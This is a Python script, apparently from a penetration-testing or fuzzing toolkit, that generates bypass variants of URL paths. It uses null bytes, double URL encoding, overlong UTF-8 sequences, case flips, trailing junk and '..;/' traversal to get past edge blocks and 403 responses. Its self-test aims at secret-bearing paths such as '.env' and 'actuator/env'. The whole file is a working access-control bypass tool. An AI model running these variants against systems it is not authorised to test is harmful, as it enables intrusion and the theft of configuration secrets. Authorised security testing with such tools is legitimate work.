#!/usr/bin/env python3
"""Emit edge-bypass variant shapes for base paths (stdin or file, one path per line).

Variants cover: null byte, single/double URL encoding of separators, Unicode
overlong, case flip, trailing junk, path-param traversal. Header-based bypasses
(method override, X-Original-URL) are request-level, not path mutations; they
stay in the fuzz skill text.

Feeds only two triggers: an edge-blocked sensitive shape, or a 403 on a
discovered directory. One bounded pass, never brute.
"""
import sys


def variants(path: str) -> list[str]:
    p = path.strip().lstrip("/")
    if not p or p.startswith("#"):
        return []
    out = [p + "%00"]
    if "." in p:
        out.append(p.replace(".", "%252e"))
        out.append(p.replace(".", "%2e"))
    if "/" in p:
        out.append(p.replace("/", "%252f"))
        out.append(p.replace("/", "%2f"))
        out.append(p.replace("/", "%c0%af"))
    if "." in p:
        out.append(p.replace(".", "%c0%ae"))
    swapped = p.swapcase()
    if swapped != p:
        out.append(swapped)
    out.extend([p + ";.js", p + "?.x", p + "%20", "..;/" + p, "/" + p + "/;/"])
    seen: set[str] = set()
    return [v for v in out if not (v in seen or seen.add(v))]


def main() -> int:
    if "--selftest" in sys.argv:
        v = variants(".env")
        assert ".env%00" in v and "%252eenv" in v and "%2eenv" in v, v
        assert "%c0%aeenv" in v, v
        assert ".env;.js" in v and ".env?.x" in v and ".env%20" in v, v
        assert "..;/.env" in v, v
        v2 = variants("actuator/env")
        assert "actuator%252fenv" in v2 and "actuator%2fenv" in v2, v2
        assert "actuator%c0%afenv" in v2, v2
        assert ".ENV" in v, v
        assert variants("#comment") == [] and variants("  ") == []
        dup = variants(".Env")
        assert len(dup) == len(set(dup)), dup
        return 0
    src = sys.stdin
    if len(sys.argv) > 1 and sys.argv[1] not in ("-", "--selftest"):
        src = open(sys.argv[1])
    for line in src:
        for v in variants(line):
            print(v)
    return 0


if __name__ == "__main__":
    sys.exit(main())
